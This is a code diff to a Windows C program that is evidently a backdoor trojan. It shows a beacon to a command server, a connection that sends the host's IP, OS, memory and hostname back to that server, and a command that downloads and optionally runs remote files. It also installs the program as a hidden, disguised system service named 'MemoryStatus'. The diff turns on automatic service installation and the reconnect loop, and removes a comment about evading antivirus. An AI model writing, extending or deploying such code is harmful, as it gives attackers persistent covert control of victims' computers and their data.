@@ -9,6 +9,7 @@
 // GCC lwininet ws2_32
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "Wininet.lib")
+#pragma pack(1)
 #pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
 #define S_OK                                   ((HRESULT)0L)
 #define S_FALSE                                ((HRESULT)1L)
@@ -34,7 +35,7 @@ char const FLAG_[15] = "yyyyyyyyyyyyyyy";
 char const address[] = "127.0.0.1";
 char const port[] = "81";
 char const SIGN[10] = "customize";
-
+char const version[] = "Ver 1.0";
 SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
     HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
 SECURITY_ATTRIBUTES saIn, saOut;
@@ -43,13 +44,13 @@ SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE ServiceStatusHandle;
 struct CMSG{
         char sign[10];
-        UINT8 mod;//自定义模式
+        UINT16 mod;//自定义模式
         UINT32 msg_l;
 };
 struct CFILE{
     char address[255];
     char save_path[255];
-    UINT8 execute;
+    UINT16 execute;
 };
 
 //-----------------------------TOOLKIT FUNCTION START------------------------------------------------
@@ -169,6 +170,7 @@ BOOL OpenURL(LPCTSTR lpszURL, INT nShowCmd)
 }
 
 
+
 //-----------------------------TOOLKIT FUNCTION END--------------------------------------------------
 
 //-------------------------SYSTEM INFOMATION START---------------------------------------------------
@@ -244,21 +246,36 @@ char* getMemoryInfo()
 	}
 	
 }
+char* getComperName(){
+    char *name;
+    char szPath[128] = "";
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    gethostname(szPath, sizeof(szPath));
+    printf("%s\n", szPath);
+    WSACleanup();
+    name=szPath;
+    return name;
+
+}
 char* getSystemInfomation(char* systeminfo){
     static char data[1024];
     char *os;
     char *ip;
     char * memory;
+    char * name;
     os = getOsInfo();
     ip = getIpAddress();
     memory = getMemoryInfo();
-    sprintf(data,"%s\n%s\n%s\n",ip,os,memory);
+    name = getComperName();
+    sprintf(data,"%s\n%s\n%s\n%s\n",ip,os,memory,name);
     if (data[1024] != '\0'){
        data[1024]='\0'; 
     }
     strcpy(systeminfo,data);
     
 }
+
 //-------------------------SYSTEM INFOMATION END-----------------------------------------------------
 
 void BackDoor(SOCKET sock){
@@ -397,20 +414,23 @@ void Handle(){
     struct CMSG msg = {
                 .sign =  "customize",
                 .mod = SERVER_SYSTEMINFO,
-                .msg_l = strlen(systeminfo)
+                .msg_l = (UINT32)strlen(systeminfo)
                 //.msg_l = 0
              };
+
     send(sock,(char*)&msg,sizeof(struct CMSG),0);
     send(sock,systeminfo,strlen(systeminfo),0);//初始化信息
     while (TRUE){
         char * address = malloc(sizeof(struct CMSG));
         int ret = recv(sock,address,sizeof(struct CMSG),0);
         struct CMSG msg = *(struct CMSG*)address;
-        printf("Sign:%s\nMOD:%d\nLONG:%d\n",msg.sign,msg.mod,msg.msg_l);
-        free(address);
-        if(ret == -1){
+        printf("size:%d:\nSign:%s\nMOD:%d\nLONG:%d\n",sizeof(struct CMSG),msg.sign,msg.mod,msg.msg_l);
+        
+        
+        if(ret == -1 || ret <= 0){
             break;
         }
+
         if (strcmp(msg.sign,SIGN) != 0){
             printf("echo debug dafa hao");
             continue;
@@ -430,23 +450,27 @@ void Handle(){
                 continue;
             case SERVER_DOWNLOAD:
                 {
-                    char * address = malloc(sizeof(struct CFILE));
+
+                    char * address2 = malloc(sizeof(struct CFILE));
                     
 
-                    ret = recv(sock,(char *)&address,511,0);
-                    struct CFILE f_obj = *(struct CFILE*)address;
-                    printf("len:%d\n",msg.msg_l);
+                    ret = recv(sock,address2,sizeof(struct CFILE),0);
+                    
+                    struct CFILE f_obj = *(struct CFILE*)address2;
+                    //printf("len:%d\n",msg.msg_l);
+                    
                     if (ret <= 0){
+                        printf("emmmmm?");
                         continue;
                     }
-                    printf("address:%s\npath:%s\nrun%d\n",f_obj.address,f_obj.save_path,f_obj.execute);
-                    if(f_obj.address && f_obj.save_path == "NULL"){
+                    printf("address:%s\npath:%s\nrun:%d\n",f_obj.address,f_obj.save_path,f_obj.execute);
+                    if(f_obj.address && strcmp(f_obj.save_path, "NULL")){
                         DownManager(f_obj.address,NULL,f_obj.execute);
                         
                     }else{
                         DownManager(f_obj.address,f_obj.save_path,f_obj.execute);
                     }
-                    free(address);
+                    free(address2);
                     continue;
                 }
                 
@@ -459,6 +483,7 @@ void Handle(){
             
 
         }
+        free(address);
         
         
 
@@ -469,7 +494,7 @@ void Init(){
     CreateEventA(0,FALSE,FALSE,"MemoryStatus");
     while(1){
         Handle();
-        //这里可以把Sleep替换成其他检测方式已绕过杀软检测
+        Sleep(3000);
     }
 }
 
@@ -509,12 +534,10 @@ void WINAPI BDHandler(DWORD dwControl)
         break;
  }
 }
-void ServiceSvchostInstall(BOOL exits){
 
-}
-void ServiceInstall(BOOL run){
+void ServiceInstall(BOOL auto_delete){
     char  szPath[MAX_PATH];
-    char  target[MAX_PATH] = "c:\\";
+    char  target[MAX_PATH] ;
     char  tar_path[MAX_PATH];
     char  Direectory[MAX_PATH];
     char  cmd[255];
@@ -529,7 +552,7 @@ void ServiceInstall(BOOL run){
     ServiceTable[1].lpServiceName = NULL;
     ServiceTable[1].lpServiceProc = NULL;
     StartServiceCtrlDispatcher(ServiceTable); 
-    // if ( !GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH) ) return 1;
+     if ( !GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH) ) return ;
     
     if( !GetModuleFileName( NULL, (LPSTR)szPath, MAX_PATH ) ) return ;
     if(!GetCurrentDirectory(MAX_PATH,Direectory)) return ;
@@ -546,18 +569,12 @@ void ServiceInstall(BOOL run){
         sprintf(cmd,"attrib +s +a +h +r %s",target);
         system(cmd);
         system("sc start MemoryStatus");
-        if (run){
-            system(target);
-            exit(0);
-        }
         
         return ;
      }
     // printf("\nRun");
 }
-void WriteRegedits(){
-    
-}
+
 int _stdcall WinMain(
     HINSTANCE hInstance,
     HINSTANCE hPrevInstance,
@@ -565,7 +582,8 @@ int _stdcall WinMain(
     int nCmdShow
 )
 {
-    //ServiceInstall();
-    Handle();
+    ServiceInstall(false);
+    
+    Init();
     return 0;
 }
